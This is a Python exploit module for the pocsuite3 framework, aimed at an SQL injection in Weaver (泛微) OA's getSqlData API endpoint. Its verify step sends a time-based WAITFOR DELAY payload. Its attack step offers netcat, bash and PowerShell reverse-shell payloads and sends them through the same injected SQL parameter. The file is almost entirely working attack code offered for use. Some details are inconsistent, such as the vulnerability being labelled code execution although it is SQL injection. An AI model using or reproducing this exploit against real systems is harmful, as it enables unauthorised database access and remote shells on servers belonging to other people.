# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
import time
import base64
from collections import OrderedDict
from urllib.parse import urlparse, urljoin
from urllib.parse import quote,unquote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class weaverOA_sql_injection(POCBase):
    vulID = 'weaverOA_sql_injection'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-03-29'
    createDate = '2022-03-29'
    updateDate = '2022-03-29'
    references = ['']
    name = 'weaverOA_sql_injection'
    appPowerLink = ''
    appName = '泛微OA'
    appVersion = """The unknown"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''fanwei_sql_injection'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url, cmd=""):
        self.timeout = 5
        cmd = cmd or "WAITFOR DELAY '00:00:03'"
        path = "/Api/portal/elementEcodeAddon/getSqlData?sql={}".format(cmd)
        vul_url = urljoin(url, path)
        print("\033[1;31m\npayload:" + cmd + '\033[0m\n')
        parse = urlparse(vul_url)
        headers = {
                "Host": "{}".format(parse.netloc),
                            }
        try:
            r = requests.get(vul_url, timeout=self.timeout, headers=headers, verify=False)
        except Exception:
            return False
        else:
            if '"api_status":true' in r.text and r.status_code == 200:
                url = vul_url
                try:
                    cmd_result = json.loads(r.text).get('data')
                    return url,cmd_result
                except Exception:
                    cmd_result = r.text
                    return False

        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Command executed successfully'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        command = self.get_option("command")
        p = self._check(self.url, cmd=command)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Command executed successfully'] = p[1]

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(weaverOA_sql_injection)
